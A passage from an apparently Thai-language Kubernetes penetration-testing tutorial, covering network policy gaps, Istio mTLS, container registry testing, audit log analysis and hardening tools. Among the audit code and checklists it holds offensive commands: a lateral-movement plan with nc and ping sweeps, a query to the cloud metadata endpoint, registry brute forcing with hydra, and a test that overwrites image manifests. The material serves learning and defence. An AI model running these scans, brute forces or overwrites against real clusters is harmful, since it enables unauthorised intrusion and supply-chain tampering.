                "podSelector": item["spec"].get("podSelector", {}),
                "ingress": item["spec"].get("ingress", []),
                "egress": item["spec"].get("egress", []),
                "policyTypes": item["spec"].get("policyTypes", [])
            })
        
        return policies
    
    def find_pods_without_policy(self, namespace: str = "default") -> list:
        """หา pods ที่ไม่มี network policy ครอบคลุม"""
        # Get all pods
        cmd = self.kubectl + ["get", "pods", "-n", namespace, "-o", "json"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        pods_data = json.loads(result.stdout)
        pods = pods_data.get("items", [])
        
        # Get all network policies
        policies = self.get_all_network_policies()
        ns_policies = [p for p in policies if p["namespace"] == namespace]
        
        unprotected_pods = []
        for pod in pods:
            pod_labels = pod["metadata"].get("labels", {})
            pod_name = pod["metadata"]["name"]
            
            # ตรวจสอบว่า pod ถูกครอบคลุมโดย policy หรือไม่
            is_covered = False
            for policy in ns_policies:
                selector = policy["podSelector"]
                match_labels = selector.get("matchLabels", {})
                
                # Empty selector matches all pods
                if not match_labels:
                    is_covered = True
                    break
                
                # Check if labels match
                if all(pod_labels.get(k) == v for k, v in match_labels.items()):
                    is_covered = True
                    break
            
            if not is_covered:
                unprotected_pods.append({
                    "name": pod_name,
                    "namespace": namespace,
                    "labels": pod_labels,
                    "issue": "No NetworkPolicy covers this pod"
                })
        
        return unprotected_pods
    
    def find_policy_gaps(self, policy: dict) -> list:
        """หาช่องโหว่ใน network policy"""
        gaps = []
        
        # ตรวจสอบ empty podSelector (applies to all pods)
        if not policy["podSelector"]:
            gaps.append("Empty podSelector - applies to ALL pods in namespace")
        
        # ตรวจสอบ ingress rules
        for ingress_rule in policy.get("ingress", []):
            # Empty from = allows all sources
            if not ingress_rule.get("from"):
                gaps.append("Ingress rule with no 'from' - allows all sources")
            
            # Empty ports = allows all ports
            if not ingress_rule.get("ports"):
                gaps.append("Ingress rule with no port restriction - allows all ports")
        
        # ตรวจสอบ egress rules
        for egress_rule in policy.get("egress", []):
            if not egress_rule.get("to"):
                gaps.append("Egress rule with no 'to' - allows all destinations")
            
            if not egress_rule.get("ports"):
                gaps.append("Egress rule with no port restriction - allows all ports")
        
        # ตรวจสอบว่ามี policyTypes ครบหรือไม่
        policy_types = policy.get("policyTypes", [])
        if "Ingress" not in policy_types:
            gaps.append("No Ingress policyType - ingress not restricted")
        if "Egress" not in policy_types:
            gaps.append("No Egress policyType - egress not restricted")
        
        return gaps
    
    def generate_lateral_movement_plan(self, source_pod: str, target_service: str) -> str:
        """วางแผน lateral movement ผ่านช่องว่างใน network policy"""
        plan = f"""
# Lateral Movement Plan
# From: {source_pod}
# To: {target_service}

1. ตรวจสอบ connectivity จาก pod ปัจจุบัน:
   nc -zv {target_service} 80 443 8080 3306 5432

2. Service discovery ผ่าน DNS:
   nslookup {target_service}.default.svc.cluster.local
   curl http://{target_service}/

3. Scan internal network:
   # หาก nmap ไม่มี ให้ใช้ bash
   for ip in 10.{{0..255}}.{{0..255}}.1; do
     (ping -c1 -W1 $ip &>/dev/null && echo $ip) &
   done

4. Port forwarding ผ่าน kubectl (ถ้ามีสิทธิ์):
   kubectl port-forward svc/{target_service} 8080:80

5. ใช้ SSRF เพื่อ pivot ผ่าน internal services
"""
        return plan


NETWORK_POLICY_TESTS = """
# Network Policy Testing Commands

# 1. ดู network policies ทั้งหมด
kubectl get networkpolicies --all-namespaces
kubectl describe networkpolicy <NAME> -n <NAMESPACE>

# 2. ทดสอบ connectivity ระหว่าง pods
# สร้าง test pod
kubectl run nettest --image=nicolaka/netshoot -it --rm -- bash

# ใน netshoot pod
nmap -sV TARGET_SERVICE
nc -zv TARGET_SERVICE 80
curl http://TARGET_SERVICE/

# 3. ตรวจสอบ DNS resolution
nslookup kubernetes.default.svc.cluster.local
nslookup TARGET_SVC.TARGET_NS.svc.cluster.local

# 4. ทดสอบ egress
curl -v https://external.com
curl http://169.254.169.254/  # AWS metadata

# 5. Scan internal subnet
for i in $(seq 1 254); do
  (nc -zv 10.0.0.$i 8080 -w1 2>&1 | grep -v refused) &
done
"""

print(NETWORK_POLICY_TESTS)
```

---

## Step 437: Service Mesh Security (Istio/Envoy)

### แนวคิด
Service mesh เช่น Istio ให้ mTLS และ traffic control แต่ถ้า config ไม่ถูกต้องอาจถูก bypass ได้

```python
import subprocess
import json
import requests
from typing import Optional

class ServiceMeshAuditor:
    """
    ตรวจสอบความปลอดภัยของ Istio/Envoy service mesh
    """
    
    def __init__(self, kubeconfig: Optional[str] = None):
        self.kubectl = ["kubectl"]
        if kubeconfig:
            self.kubectl.extend(["--kubeconfig", kubeconfig])
    
    def check_mtls_configuration(self) -> list:
        """ตรวจสอบการตั้งค่า mTLS"""
        findings = []
        
        # ตรวจสอบ PeerAuthentication policies
        result = subprocess.run(
            self.kubectl + ["get", "peerauthentication",
                           "--all-namespaces", "-o", "json"],
            capture_output=True, text=True
        )
        
        if result.returncode == 0:
            data = json.loads(result.stdout)
            for item in data.get("items", []):
                spec = item["spec"]
                mtls_mode = spec.get("mtls", {}).get("mode", "UNSET")
                
                if mtls_mode in ["DISABLE", "PERMISSIVE"]:
                    findings.append({
                        "resource": item["metadata"]["name"],
                        "namespace": item["metadata"]["namespace"],
                        "issue": f"mTLS mode is {mtls_mode} - plaintext traffic allowed",
                        "severity": "HIGH" if mtls_mode == "DISABLE" else "MEDIUM"
                    })
        
        # ตรวจสอบ DestinationRules
        result = subprocess.run(
            self.kubectl + ["get", "destinationrules",
                           "--all-namespaces", "-o", "json"],
            capture_output=True, text=True
        )
        
        if result.returncode == 0:
            data = json.loads(result.stdout)
            for item in data.get("items", []):
                tls_settings = (
                    item["spec"]
                    .get("trafficPolicy", {})
                    .get("tls", {})
                )
                tls_mode = tls_settings.get("mode", "")
                
                if tls_mode in ["DISABLE", ""]:
                    findings.append({
                        "resource": item["metadata"]["name"],
                        "issue": "DestinationRule has no TLS configuration"
                    })
        
        return findings
    
    def check_envoy_admin_exposure(self, pods: list) -> list:
        """ตรวจสอบ Envoy admin interface ที่เปิดเผย"""
        exposed = []
        
        for pod in pods:
            # Envoy admin port is typically 15000
            port_forward_cmd = [
                "kubectl", "port-forward",
                f"pod/{pod}", "15000:15000"
            ]
            
            # ตรวจสอบ admin endpoints
            admin_endpoints = [
                "http://localhost:15000/stats",
                "http://localhost:15000/config_dump",
                "http://localhost:15000/clusters",
                "http://localhost:15000/listeners",
                "http://localhost:15000/server_info",
            ]
            
            exposed.append({
                "pod": pod,
                "admin_endpoints": admin_endpoints,
                "note": "Start port-forward then test: kubectl port-forward pod/NAME 15000:15000"
            })
        
        return exposed
    
    def find_authorization_policy_gaps(self) -> list:
        """หาช่องว่างใน Authorization Policies"""
        gaps = []
        
        result = subprocess.run(
            self.kubectl + ["get", "authorizationpolicies",
                           "--all-namespaces", "-o", "json"],
            capture_output=True, text=True
        )
        
        if result.returncode != 0:
            return [{"note": "No AuthorizationPolicy found - all traffic allowed"}]
        
        data = json.loads(result.stdout)
        
        if not data.get("items"):
            gaps.append({
                "issue": "No AuthorizationPolicies defined",
                "impact": "All traffic allowed between services",
                "severity": "HIGH"
            })
        
        for item in data.get("items", []):
            spec = item["spec"]
            
            # Empty rules = deny all
            if not spec.get("rules"):
                continue
            
            for rule in spec.get("rules", []):
                # Check for overly permissive rules
                for source in rule.get("from", []):
                    principals = source.get("source", {}).get("principals", [])
                    if "*" in principals:
                        gaps.append({
                            "policy": item["metadata"]["name"],
                            "namespace": item["metadata"]["namespace"],
                            "issue": "Wildcard principal - allows any service"
                        })
        
        return gaps
    
    def test_mtls_bypass(self, target_service: str, port: int = 80) -> dict:
        """ทดสอบการ bypass mTLS"""
        results = {}
        
        # Test 1: Direct plaintext connection
        try:
            resp = requests.get(
                f"http://{target_service}:{port}/",
                timeout=5, verify=False
            )
            results["plaintext_bypass"] = {
                "success": resp.status_code < 400,
                "status": resp.status_code
            }
        except Exception as e:
            results["plaintext_bypass"] = {"success": False, "error": str(e)}
        
        return results


ISTIO_AUDIT_COMMANDS = """
# Istio Security Audit Commands

# 1. ตรวจสอบ Istio version
istioctl version
kubectl -n istio-system get pods

# 2. ตรวจสอบ mTLS status
istioctl proxy-status
istioctl authn tls-check PODNAME.NAMESPACE

# 3. ดู PeerAuthentication
kubectl get peerauthentication --all-namespaces

# 4. ตรวจสอบ AuthorizationPolicies
kubectl get authorizationpolicies --all-namespaces -o yaml

# 5. ดู Envoy config
istioctl proxy-config listeners PODNAME.NAMESPACE
istioctl proxy-config clusters PODNAME.NAMESPACE
istioctl proxy-config routes PODNAME.NAMESPACE

# 6. Intercept traffic (ถ้ามีสิทธิ์)
kubectl exec -it PODNAME -c istio-proxy -- sh
# ดู iptables rules
iptables -t nat -L

# 7. Bypass mTLS (ถ้า PERMISSIVE mode)
curl http://SERVICE.NAMESPACE.svc.cluster.local/

# 8. ตรวจสอบ cert expiry
openssl s_client -connect SERVICE:443 2>/dev/null | \
  openssl x509 -noout -enddate
"""

print(ISTIO_AUDIT_COMMANDS)
```

---

## Step 438: Container Registry Security

### แนวคิด
Container registries เก็บ images ที่ใช้ใน production การ compromise registry หมายถึงการโจมตี supply chain

```python
import requests
import json
import base64
from typing import Optional
import urllib3

urllib3.disable_warnings()

class RegistrySecurityTester:
    """
    ทดสอบความปลอดภัยของ Container Registry
    """
    
    def __init__(self, registry_url: str, username: str = None, password: str = None):
        self.registry = registry_url.rstrip("/")
        self.auth = None
        if username and password:
            self.auth = (username, password)
    
    def check_anonymous_access(self) -> dict:
        """ตรวจสอบ anonymous access"""
        # Test catalog endpoint
        try:
            resp = requests.get(
                f"{self.registry}/v2/_catalog",
                verify=False, timeout=10
            )
            
            if resp.status_code == 200:
                return {
                    "anonymous_access": True,
                    "catalog": resp.json(),
                    "severity": "CRITICAL"
                }
            elif resp.status_code == 401:
                return {
                    "anonymous_access": False,
                    "auth_required": True,
                    "www_authenticate": resp.headers.get("WWW-Authenticate")
                }
        except Exception as e:
            return {"error": str(e)}
        
        return {"anonymous_access": False}
    
    def list_repositories(self) -> list:
        """แสดง repositories ทั้งหมด"""
        try:
            resp = requests.get(
                f"{self.registry}/v2/_catalog",
                auth=self.auth,
                verify=False
            )
            if resp.status_code == 200:
                return resp.json().get("repositories", [])
        except Exception:
            pass
        return []
    
    def list_tags(self, repo: str) -> list:
        """แสดง tags ของ repository"""
        try:
            resp = requests.get(
                f"{self.registry}/v2/{repo}/tags/list",
                auth=self.auth,
                verify=False
            )
            if resp.status_code == 200:
                return resp.json().get("tags", [])
        except Exception:
            pass
        return []
    
    def get_image_manifest(self, repo: str, tag: str) -> dict:
        """ดึง manifest ของ image"""
        headers = {"Accept": "application/vnd.docker.distribution.manifest.v2+json"}
        try:
            resp = requests.get(
                f"{self.registry}/v2/{repo}/manifests/{tag}",
                auth=self.auth,
                headers=headers,
                verify=False
            )
            if resp.status_code == 200:
                return resp.json()
        except Exception:
            pass
        return {}
    
    def pull_layer(self, repo: str, digest: str, output_path: str) -> bool:
        """ดึง layer จาก registry"""
        try:
            resp = requests.get(
                f"{self.registry}/v2/{repo}/blobs/{digest}",
                auth=self.auth,
                verify=False,
                stream=True
            )
            if resp.status_code == 200:
                with open(output_path, "wb") as f:
                    for chunk in resp.iter_content(chunk_size=8192):
                        f.write(chunk)
                return True
        except Exception:
            pass
        return False
    
    def test_image_overwrite(self, repo: str, tag: str) -> dict:
        """ทดสอบว่าสามารถ overwrite image ได้หรือไม่"""
        # Create minimal manifest
        test_manifest = {
            "schemaVersion": 2,
            "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
            "config": {
                "mediaType": "application/vnd.docker.container.image.v1+json",
                "size": 1,
                "digest": "sha256:test"
            },
            "layers": []
        }
        
        headers = {
            "Content-Type": "application/vnd.docker.distribution.manifest.v2+json"
        }
        
        try:
            resp = requests.put(
                f"{self.registry}/v2/{repo}/manifests/{tag}",
                auth=self.auth,
                headers=headers,
                json=test_manifest,
                verify=False
            )
            return {
                "can_overwrite": resp.status_code in [200, 201],
                "status_code": resp.status_code,
                "severity": "CRITICAL" if resp.status_code in [200, 201] else "INFO"
            }
        except Exception as e:
            return {"error": str(e)}
    
    def find_secrets_in_image(self, repo: str, tag: str) -> list:
        """ค้นหา secrets ใน image layers"""
        manifest = self.get_image_manifest(repo, tag)
        secrets_found = []
        
        for layer in manifest.get("layers", []):
            digest = layer.get("digest")
            if digest:
                # Download and scan layer
                layer_path = f"/tmp/{digest.replace(':', '_')}.tar.gz"
                if self.pull_layer(repo, digest, layer_path):
                    # Scan for secrets (simplified)
                    secrets_found.append({
                        "layer": digest[:20],
                        "note": f"Layer downloaded to {layer_path} for analysis"
                    })
        
        return secrets_found
    
    def brute_force_repos(self, wordlist: list = None) -> list:
        """brute force ชื่อ repository"""
        if not wordlist:
            wordlist = [
                "app", "api", "backend", "frontend", "web",
                "db", "database", "admin", "nginx", "redis",
                "mysql", "postgres", "mongodb", "elasticsearch"
            ]
        
        found = []
        for name in wordlist:
            try:
                resp = requests.get(
                    f"{self.registry}/v2/{name}/tags/list",
                    auth=self.auth,
                    verify=False,
                    timeout=3
                )
                if resp.status_code == 200:
                    tags = resp.json().get("tags", [])
                    found.append({"repo": name, "tags": tags})
            except Exception:
                pass
        
        return found


REGISTRY_AUDIT = """
# Container Registry Security Audit

# 1. ตรวจสอบ anonymous access
curl -sk https://REGISTRY/v2/ | python3 -m json.tool
curl -sk https://REGISTRY/v2/_catalog

# 2. ด้วย authentication
docker login REGISTRY -u USER -p PASS
curl -u USER:PASS https://REGISTRY/v2/_catalog

# 3. ดู tags
curl -u USER:PASS https://REGISTRY/v2/REPO/tags/list

# 4. Brute force credentials
hydra -l admin -P rockyou.txt REGISTRY http-get /v2/

# 5. Pull image โดยไม่ login (ถ้า anonymous allowed)
docker pull REGISTRY/REPO:TAG

# 6. Inspect image for secrets
docker pull REGISTRY/APP:latest
docker history REGISTRY/APP:latest --no-trunc
docker run --rm REGISTRY/APP:latest env

# 7. Scan with Trivy
trivy image REGISTRY/APP:latest

# 8. ดู image config
docker inspect REGISTRY/APP:latest | jq '.[0].Config'
"""

print(REGISTRY_AUDIT)
```

---

## Step 439: Kubernetes Audit Log Analysis

### แนวคิด
Kubernetes audit logs บันทึกกิจกรรมทั้งหมดใน cluster การวิเคราะห์ logs ช่วยตรวจจับ attacks และ lateral movement

```python
import json
import re
from datetime import datetime
from collections import defaultdict
from typing import Optional

class K8sAuditLogAnalyzer:
    """
    วิเคราะห์ Kubernetes Audit Logs เพื่อตรวจจับ suspicious activities
    """
    
    SUSPICIOUS_PATTERNS = [
        {
            "name": "Exec into pods",
            "verb": "create",
            "subresource": "exec",
            "severity": "HIGH"
        },
        {
            "name": "Port forward",
            "verb": "create",
            "subresource": "portforward",
            "severity": "MEDIUM"
        },
        {
            "name": "Access secrets",
            "verb": ["get", "list"],
            "resource": "secrets",
            "severity": "HIGH"
        },
        {
            "name": "Privileged pod creation",
            "verb": "create",
            "resource": "pods",
            "severity": "CRITICAL"
        },
        {
            "name": "ClusterRoleBinding creation",
            "verb": "create",
            "resource": "clusterrolebindings",
            "severity": "CRITICAL"
        },
        {
            "name": "Node access",
            "verb": ["get", "list"],
            "resource": "nodes",
            "severity": "LOW"
        },
        {
            "name": "Anonymous access",
            "user": "system:anonymous",
            "severity": "HIGH"
        },
        {
            "name": "Failed authentication",
            "response_code": 401,
            "severity": "MEDIUM"
        },
        {
            "name": "Privilege escalation attempt",
            "response_code": 403,
            "severity": "HIGH"
        },
    ]
    
    def __init__(self, log_file: str):
        self.log_file = log_file
        self.events = []
        self._load_logs()
    
    def _load_logs(self):
        """โหลด audit logs"""
        try:
            with open(self.log_file) as f:
                for line in f:
                    line = line.strip()
                    if line:
                        try:
                            self.events.append(json.loads(line))
                        except json.JSONDecodeError:
                            pass
        except FileNotFoundError:
            print(f"Log file not found: {self.log_file}")
    
    def analyze_suspicious_activities(self) -> list:
        """วิเคราะห์กิจกรรมที่น่าสงสัย"""
        findings = []
        
        for event in self.events:
            for pattern in self.SUSPICIOUS_PATTERNS:
                match = False
                
                # Check verb
                event_verb = event.get("verb", "")
                pattern_verb = pattern.get("verb")
                if pattern_verb:
                    if isinstance(pattern_verb, list):
                        if event_verb not in pattern_verb:
                            continue
                    elif event_verb != pattern_verb:
                        continue
                
                # Check resource
                obj_ref = event.get("objectRef", {})
                pattern_resource = pattern.get("resource")
                if pattern_resource:
                    if obj_ref.get("resource") != pattern_resource:
                        continue
                
                # Check subresource
                pattern_sub = pattern.get("subresource")
                if pattern_sub:
                    if obj_ref.get("subresource") != pattern_sub:
                        continue
                
                # Check user
                pattern_user = pattern.get("user")
                if pattern_user:
                    user_info = event.get("user", {})
                    if user_info.get("username") != pattern_user:
                        continue
                
                # Check response code
                pattern_code = pattern.get("response_code")
                if pattern_code:
                    if event.get("responseStatus", {}).get("code") != pattern_code:
                        continue
                
                findings.append({
                    "time": event.get("requestReceivedTimestamp"),
                    "user": event.get("user", {}).get("username", "unknown"),
                    "source_ip": event.get("sourceIPs", ["unknown"])[0],
                    "action": pattern["name"],
                    "severity": pattern["severity"],
                    "resource": f"{obj_ref.get('namespace', '')}/{obj_ref.get('name', '')}",
                    "verb": event_verb
                })
        
        return findings
    
    def detect_brute_force(self, threshold: int = 10) -> list:
        """ตรวจจับ brute force attempts"""
        failed_by_ip = defaultdict(list)
        
        for event in self.events:
            code = event.get("responseStatus", {}).get("code", 0)
            if code in [401, 403]:
                ips = event.get("sourceIPs", [])
                ts = event.get("requestReceivedTimestamp", "")
                for ip in ips:
                    failed_by_ip[ip].append(ts)
        
        alerts = []
        for ip, times in failed_by_ip.items():
            if len(times) >= threshold:
                alerts.append({
                    "source_ip": ip,
                    "failed_count": len(times),
                    "first_seen": min(times) if times else None,
                    "last_seen": max(times) if times else None,
                    "alert": "Possible brute force attack"
                })
        
        return sorted(alerts, key=lambda x: x["failed_count"], reverse=True)
    
    def find_lateral_movement(self) -> list:
        """ตรวจจับ lateral movement"""
        movements = []
        exec_events = [
            e for e in self.events
            if e.get("verb") == "create"
            and e.get("objectRef", {}).get("subresource") == "exec"
        ]
        
        for event in exec_events:
            movements.append({
                "time": event.get("requestReceivedTimestamp"),
                "user": event.get("user", {}).get("username"),
                "pod": event.get("objectRef", {}).get("name"),
                "namespace": event.get("objectRef", {}).get("namespace"),
                "source_ip": event.get("sourceIPs", ["?"])[0],
                "alert": "Exec into pod detected - possible lateral movement"
            })
        
        return movements
    
    def generate_timeline(self) -> list:
        """สร้าง timeline ของ suspicious activities"""
        findings = self.analyze_suspicious_activities()
        timeline = sorted(findings, key=lambda x: x.get("time", ""))
        return timeline
    
    def generate_report(self) -> str:
        """สร้างรายงาน"""
        report = ["=" * 70]
        report.append("KUBERNETES AUDIT LOG ANALYSIS REPORT")
        report.append("=" * 70)
        report.append(f"Total events analyzed: {len(self.events)}")
        
        # Suspicious activities
        activities = self.analyze_suspicious_activities()
        report.append(f"\nSuspicious activities found: {len(activities)}")
        
        by_severity = defaultdict(list)
        for a in activities:
            by_severity[a["severity"]].append(a)
        
        for severity in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
            if severity in by_severity:
                report.append(f"\n  {severity}: {len(by_severity[severity])} events")
                for event in by_severity[severity][:5]:  # Top 5
                    report.append(
                        f"    [{event['time'][:19]}] "
                        f"{event['user']} - {event['action']} - "
                        f"{event['resource']}"
                    )
        
        # Brute force
        bf = self.detect_brute_force()
        if bf:
            report.append(f"\nBrute force detections: {len(bf)}")
            for alert in bf[:3]:
                report.append(f"  {alert['source_ip']}: {alert['failed_count']} failures")
        
        return "\n".join(report)


AUDIT_LOG_CONFIG = """
# Kubernetes Audit Policy Configuration
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # บันทึกทุก action บน secrets
  - level: Metadata
    resources:
    - group: ""
      resources: ["secrets", "configmaps"]
  
  # บันทึก exec/portforward
  - level: Request
    resources:
    - group: ""
      resources: ["pods/exec", "pods/portforward", "pods/log"]
  
  # บันทึก RBAC changes
  - level: Request
    resources:
    - group: "rbac.authorization.k8s.io"
      resources: ["clusterroles", "clusterrolebindings", "roles", "rolebindings"]
  
  # บันทึก authentication failures
  - level: Metadata
    omitStages:
    - RequestReceived
    users: ["system:anonymous"]
  
  # Default
  - level: Metadata
    omitStages:
    - RequestReceived
"""

print(AUDIT_LOG_CONFIG)
```

---

## Step 440: Kubernetes Security Tools and Hardening

### แนวคิด
การใช้เครื่องมือ security scanning และการ hardening cluster เป็นสิ่งสำคัญสำหรับการป้องกัน Kubernetes

```python
import subprocess
import json
import os
from typing import Optional

class K8sSecurityHardener:
    """
    Kubernetes Security Hardening และ Assessment Tools
    """
    
    def run_kube_bench(self, config: str = "auto") -> dict:
        """รัน kube-bench CIS benchmark"""
        cmd = ["kube-bench", "--json"]
        if config != "auto":
            cmd.extend(["--config-dir", config])
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            try:
                data = json.loads(result.stdout)
                # Summarize results
                summary = {
                    "pass": 0, "fail": 0, "warn": 0, "info": 0,
                    "failed_tests": []
                }
                
                for test_group in data.get("Controls", []):
                    for test in test_group.get("tests", []):
                        for result_item in test.get("results", []):
                            status = result_item.get("status", "").lower()
                            if status in summary:
                                summary[status] += 1
                            
                            if status == "fail":
                                summary["failed_tests"].append({
                                    "test_number": result_item.get("test_number"),
                                    "test_desc": result_item.get("test_desc"),
                                    "remediation": result_item.get("remediation", "")
                                })
                
                return summary
            except Exception as e:
                return {"error": str(e), "raw": result.stdout[:500]}
        
        return {"error": result.stderr}
    
    def run_falco_test(self) -> list:
        """ตรวจสอบ Falco rules"""
        # ตรวจสอบว่า Falco กำลังทำงาน
        result = subprocess.run(
            ["kubectl", "-n", "falco", "get", "pods",
             "-l", "app=falco", "-o", "json"],
            capture_output=True, text=True
        )
        
        falco_findings = []
        if result.returncode == 0:
            data = json.loads(result.stdout)
            pods = data.get("items", [])
            
            if not pods:
                falco_findings.append({
                    "status": "NOT_INSTALLED",
                    "recommendation": "Install Falco for runtime security monitoring"
                })
            else:
                for pod in pods:
                    falco_findings.append({
                        "pod": pod["metadata"]["name"],
                        "status": pod["status"].get("phase", "Unknown"),
                        "node": pod["spec"].get("nodeName")
                    })
        
        return falco_findings
    
    def generate_pod_security_policy(self, namespace: str) -> str:
        """สร้าง restrictive Pod Security Policy"""
        psp = """apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
  annotations:
    seccomp.security.alpha.kubernetes.io/allowedProfiles: 'docker/default,runtime/default'
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
    - 'persistentVolumeClaim'
  hostNetwork: false
  hostIPC: false
  hostPID: false
  runAsUser:
    rule: 'MustRunAsNonRoot'
  seLinux:
    rule: 'RunAsAny'
  supplementalGroups:
    rule: 'MustRunAs'
    ranges:
      - min: 1
        max: 65535
  fsGroup:
    rule: 'MustRunAs'
    ranges:
      - min: 1
        max: 65535
  readOnlyRootFilesystem: true
"""
        return psp
    
    def check_cluster_hardening(self) -> list:
        """ตรวจสอบการ hardening ของ cluster"""
        checks = []
        
        hardening_checks = [
            # ตรวจสอบ RBAC
            ("RBAC enabled",
             ["kubectl", "auth", "can-i", "--list", "--as=system:anonymous"]),
            
            # ตรวจสอบ admission controllers
            ("Pod Security check",
             ["kubectl", "get", "pods", "--all-namespaces",
              "-o", "jsonpath={.items[*].spec.securityContext}"]),
        ]
        
        for check_name, cmd in hardening_checks:
            result = subprocess.run(cmd, capture_output=True, text=True)
            checks.append({
                "check": check_name,
                "result": result.stdout[:200],
                "success": result.returncode == 0
            })
        
        return checks
    
    def generate_hardening_checklist(self) -> str:
        """สร้าง hardening checklist"""
        checklist = """
# Kubernetes Security Hardening Checklist

## Control Plane
☐ Disable anonymous authentication (--anonymous-auth=false)
☐ Enable RBAC authorization (--authorization-mode=RBAC)
☐ Enable audit logging
☐ Use TLS for all API communications
☐ Restrict etcd access with TLS certs
☐ Enable admission controllers:
  - PodSecurity
  - NodeRestriction
  - LimitRanger
  - ResourceQuota

## Worker Nodes
☐ Disable anonymous kubelet access
☐ Enable Node authorization
☐ Rotate kubelet certificates
☐ Restrict pod capabilities

## Networking
☐ Enable Network Policies for all namespaces
☐ Use CNI plugin that supports NetworkPolicy
☐ Enable mTLS with service mesh
☐ Restrict external access

## Workloads
☐ Run containers as non-root
☐ Set readOnlyRootFilesystem: true
☐ Drop all capabilities by default
☐ Set resource limits and requests
☐ Use Pod Security Standards (restricted profile)
☐ Avoid privileged containers
☐ Don't mount docker.sock

## Supply Chain
☐ Scan images with Trivy/Grype
☐ Sign images with Cosign
☐ Use private registry with access control
☐ Implement image pull secrets
☐ Verify image signatures before deployment

## Monitoring
☐ Install Falco for runtime security
☐ Enable audit logging
☐ Set up alerts for suspicious activities
☐ Regular kube-bench runs
☐ Implement security observability
"""
        return checklist


# Full security assessment workflow
SECURITY_TOOLS = """
# Kubernetes Security Tools

# 1. kube-bench - CIS Benchmark
docker run --pid=host --userns=host --rm -ti \
  -v /etc:/etc:ro -v /var:/var:ro \
  -v /proc:/proc:ro --net=host \
  aquasec/kube-bench:latest

# 2. Falco - Runtime Security
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \
  --set falco.grpc.enabled=true \
  --set falco.grpcOutput.enabled=true

# Monitor Falco alerts
kubectl logs -f ds/falco -n falco

# 3. Trivy - Vulnerability Scanner  
# Scan cluster
trivy k8s --report all
trivy k8s --report summary cluster

# 4. kube-hunter - Penetration Testing
python3 -m pip install kube-hunter
kube-hunter --remote TARGET_IP
kube-hunter --pod  # run inside cluster

# 5. Popeye - Configuration Linter
docker run --rm -it \
  -v $HOME/.kube:/root/.kube \
  derailed/popeye

# 6. Checkov - IaC Scanner
pip install checkov
checkov -d /path/to/k8s/manifests

# 7. OPA/Gatekeeper - Policy Enforcement
kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.12/deploy/gatekeeper.yaml

# 8. Cosign - Image Signing
cosign sign --key cosign.key IMAGE:TAG
cosign verify --key cosign.pub IMAGE:TAG
"""

if __name__ == "__main__":
    hardener = K8sSecurityHardener()
    print(hardener.generate_hardening_checklist())
    print(hardener.generate_pod_security_policy("production"))
```

---

## สรุป Part 44

ในส่วนนี้ได้เรียนรู้:

1. **RBAC Misconfiguration** - การตรวจสอบและใช้ประโยชน์จาก misconfigured RBAC
2. **etcd Exploitation** - การเข้าถึง etcd โดยตรงและดึง secrets
3. **API Server Attacks** - การโจมตี unauthenticated API endpoints
4. **Container Escape** - เทคนิคการ escape จาก privileged containers
5. **Image Security** - การวิเคราะห์ image layers สำหรับ secrets และช่องโหว่
6. **Network Policy Bypass** - การหาช่องว่างใน network policies
7. **Service Mesh Security** - การทดสอบ Istio/Envoy configurations
8. **Registry Security** - การทดสอบ container registry access controls
9. **Audit Log Analysis** - การวิเคราะห์ audit logs เพื่อตรวจจับ attacks
10. **Security Hardening** - การใช้เครื่องมือและ checklist สำหรับ hardening

### เครื่องมือสำคัญ
- `kube-bench` - CIS benchmark scanning
- `Falco` - Runtime threat detection
- `Trivy` - Vulnerability scanning
- `kube-hunter` - Kubernetes penetration testing
- `OPA Gatekeeper` - Policy enforcement
- `Cosign` - Image signing
